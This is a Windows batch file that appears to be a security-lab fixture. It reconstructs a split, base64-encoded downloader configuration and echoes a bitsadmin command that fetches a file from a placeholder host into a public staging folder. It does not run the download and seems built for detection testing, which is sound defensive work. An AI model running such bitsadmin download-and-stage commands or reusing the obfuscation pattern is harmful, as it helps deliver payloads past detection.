@echo off
setlocal EnableExtensions EnableDelayedExpansion
rem HUNTRESS-CODEC:split_fragments|identity
rem HUNTRESS-MATERIAL:dj0xfHN0ZXBzPWFjcXVpcmVfcmVtb3RlLHdyaXRlX2ZpbGV8YWRhcHRlcj1iaXRzYWRtaW4uZXhlfHN0YWdlX2NvdW50PTF8Z3JhcGg9c2FtZV9sYW5ndWFnZXxuZXh0X2xhbmd1YWdlPW5vbmV8Y2FtcGFpZ25faWQ9Y2FtcGFpZ24tNzBkZjhmZjg2ZHx1cmw9aHR0cHM6Ly83MGRmOGZmODZkLmV4YW1wbGUuaW52YWxpZC83MmJhODZmOS5kYXR8ZmlsZV9wYXRoPUM6XFVzZXJzXFB1YmxpY1xIdW50cmVzc0xhYlxzdGFnZS03MGRmOGZmODZkLmRhdA==
rem analyst reconstruction fixture
rem HUNTRESS-EXTENSION:cmd
if /i "%~1"=="--inspect" goto :HUNTRESS_INSPECT
if /i "%~1"=="--plan" goto :HUNTRESS_PLAN
exit /b 0
:HUNTRESS_INSPECT
set "fragment0=v=1|steps=acquire_remote,write_file|adapter=bitsadmin.exe|stage_"& rem HUNTRESS quote compound
set "fragment1=count=1|graph=same_language|next_language=none|campaign_id=campa"& rem HUNTRESS quote compound
set "fragment2=ign-70df8ff86d|url=https://70df8ff86d.example.invalid/72ba86f9.d"& rem HUNTRESS quote compound
set "fragment3=at|file_path=C:\Users\Public\HuntressLab\stage-70df8ff86d.dat"& rem HUNTRESS quote compound
goto :HUNTRESS_SEPARATOR_DONE
(ver >nul) || (rem HUNTRESS separator double pipe)
:HUNTRESS_SEPARATOR_DONE
set "neutral_environment_probe=31672ab8"
set "recovered_configuration=%fragment0%%fragment1%%fragment2%%fragment3%"
echo(!recovered_configuration!
exit /b 0
:HUNTRESS_PLAN
echo bitsadmin.exe acquire https://70df8ff86d.example.invalid/72ba86f9.dat to C:\Users\Public\HuntressLab\stage-70df8ff86d.dat
exit /b 0
